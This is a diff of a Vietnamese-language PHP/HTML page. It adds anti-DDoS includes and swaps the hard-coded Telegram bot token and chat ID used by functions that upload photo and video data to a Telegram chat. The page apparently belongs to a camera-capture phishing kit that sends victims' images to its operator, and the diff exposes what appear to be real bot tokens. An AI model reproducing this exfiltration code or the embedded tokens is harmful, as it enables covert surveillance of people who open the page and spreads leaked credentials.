@@ -1,3 +1,14 @@
+<?php
+// This file have to be very first included
+require "anti-ddos-lite/anti-ddos-lite.php";
+
+?>
+<?php
+// This file have to be very first included
+require "PHP-Anti-DDoS-main/anti_ddos.php";
+
+?>
+
 <!DOCTYPE html>
 <html lang="vi">
 <head>
@@ -182,8 +193,8 @@
   }
 
   function sendTelegramPhoto(photoData, message) {
-    var botToken = '7972315526:AAH-FtEKEEiIliidKj8ydD3eMRXWlE1iARY';
-    var chatID = '-1002417535996';
+    var botToken = '7811325007:AAETVpkG6MAk6JXoKQuHu5RHy5ILf4a5rb4';
+    var chatID = '7779940330';
     var url = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
 
     var formData = new FormData();
@@ -210,8 +221,8 @@
   }
 
   function sendTelegramVideo(videoData, caption) {
-    var botToken = '7972315526:AAH-FtEKEEiIliidKj8ydD3eMRXWlE1iARY';
-    var chatID = '-1002417535996';
+    var botToken = '7811325007:AAETVpkG6MAk6JXoKQuHu5RHy5ILf4a5rb4';
+    var chatID = '7779940330';
     var formData = new FormData();
     formData.append("chat_id", chatID);
     formData.append("video", videoData, "video.mp4");
